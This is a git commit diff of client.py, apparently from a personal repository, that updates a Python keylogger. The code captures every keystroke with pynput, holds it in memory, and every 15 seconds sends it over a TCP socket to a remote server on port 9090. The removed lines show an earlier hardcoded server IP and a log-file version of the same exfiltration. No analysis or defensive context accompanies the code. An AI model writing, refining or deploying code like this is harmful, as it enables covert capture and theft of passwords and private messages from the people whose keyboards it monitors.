edb74e72b4e85d1a0ffb252d19a4390682a644e5
Fryderyk200 <146193454+Fryderyk200@users.noreply.github.com>
2024-04-03 20:18:55 +0100

    Update client.py

--- client.py
+++ client.py
@@ -2,13 +2,14 @@ from pynput.keyboard import Listener
 import socket
 import threading
 import time
-SERVER = '100.84.214.6'
+
+SERVER = ''
 PORT = 9090
-
 listener_active = False
+keystrokes = []  # In-memory storage for keystrokes
 
-#SOCKETS
-def send_message(FilePath):
+# SOCKETS
+def send_keystrokes(keystrokes_data):
     global listener_active
     with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
         s.connect((SERVER, PORT))
@@ -20,31 +21,32 @@ def send_message(FilePath):
         if response.decode('utf-8') == 'restart_listener':
             listener_active = False
 
-        with open(FilePath, 'r') as file:
-            contents = file.read()
-            s.sendall(contents.encode('utf-8'))
-    print('File sent Successfully')
+        # Convert list of keystrokes to string and send
+        keystrokes_str = ''.join(keystrokes_data)
+        s.sendall(keystrokes_str.encode('utf-8'))
+    print('Keystrokes sent Successfully')
 
-
-#keylogger key
+# Keylogger key
 def on_press(key):
-    with open('log.txt', 'a') as f:
-        f.write(str(key) + '\n')
+    global keystrokes
+    keystrokes.append(str(key))
 
-#keylogger
+# Keylogger
 def keyboard_listener():
     with Listener(on_press=on_press) as listener:
         listener.join()
 
-def start_listiner():
-    global listener_active
+def start_listener():
+    global listener_active, keystrokes
     listener_thread = threading.Thread(target=keyboard_listener)
     listener_thread.start()
-    listener_active = False
+    listener_active = True
 
 while True:
     if not listener_active:
-        start_listiner()
-        time.sleep(30)
-        send_message('Log.txt')
-        open('Log.txt', 'w').close()
+        start_listener()
+        # Wait for a certain amount of time or number of keystrokes
+        time.sleep(15)
+        send_keystrokes(keystrokes)
+        # Clear the in-memory keystrokes after sending
+        keystrokes = []
